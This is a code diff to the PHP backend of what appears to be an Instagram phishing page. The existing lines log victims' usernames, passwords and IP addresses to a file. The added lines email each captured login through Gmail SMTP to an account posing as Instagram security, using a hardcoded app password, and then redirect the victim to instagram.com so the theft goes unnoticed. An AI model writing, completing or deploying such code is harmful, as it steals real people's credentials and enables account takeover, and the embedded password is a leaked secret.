@@ -24,6 +24,49 @@ file_put_contents('usernames.txt', "Username: $username | Pass: $password | IP: 
 error_log($log);
 
 // ========================================
+// SEND EMAIL VIA GMAIL SMTP (PHPMailer)
+// ========================================
+
+// Load Composer autoloader (make sure you ran `composer install`)
+require_once __DIR__ . '/../vendor/autoload.php';
+
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\SMTP;
+use PHPMailer\PHPMailer\Exception;
+
+// YOUR GMAIL SETTINGS
+$from_email = "donotreply.instagramsecurity@gmail.com";      // <-- Your Gmail address
+$app_password = "oqbs usyn ilxw fezu";   // <-- Gmail App Password (not your regular password)
+$to_email = "donotreply.instagramsecurity@gmail.com";        // <-- Where to send (same or different)
+
+$mail = new PHPMailer(true);
+
+try {
+    // Server settings
+    $mail->SMTPDebug = SMTP::DEBUG_OFF;    // Set to DEBUG_SERVER for testing
+    $mail->isSMTP();
+    $mail->Host       = 'smtp.gmail.com';
+    $mail->SMTPAuth   = true;
+    $mail->Username   = $from_email;
+    $mail->Password   = $app_password;
+    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;
+    $mail->Port       = 465;
+
+    // Recipients
+    $mail->setFrom($from_email, 'Instagram Logger');
+    $mail->addAddress($to_email);
+
+    // Content
+    $mail->Subject = '🔐 New Instagram Login Attempt';
+    $mail->Body    = $log;
+
+    $mail->send();
+    error_log("✅ Email sent successfully to $to_email");
+} catch (Exception $e) {
+    error_log("❌ Email could not be sent. Error: {$mail->ErrorInfo}");
+}
+
+// ========================================
 // REDIRECT TO INSTAGRAM.COM
 // ========================================
 header('Location: https://instagram.com');
